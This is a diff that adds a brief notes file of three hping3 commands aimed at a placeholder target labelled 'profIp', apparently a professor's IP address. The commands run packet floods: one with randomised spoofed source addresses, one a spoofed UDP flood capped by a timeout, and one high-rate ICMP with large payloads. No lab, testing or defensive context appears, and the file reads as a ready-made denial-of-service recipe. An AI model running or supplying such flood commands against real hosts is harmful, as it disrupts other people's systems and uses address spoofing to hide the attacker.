@@ -1,0 +1,4 @@
+hping
+1.) hping3 -c 10000 --flood --rand-source (profIp)
+2.) timeout 90s hping3 -2 -c 9000 --faster -a 10.0.0.5(privateip example) (profIp)
+3.) hping3 -1 -c 11000 -d 1024 -i u13333 (profIp)
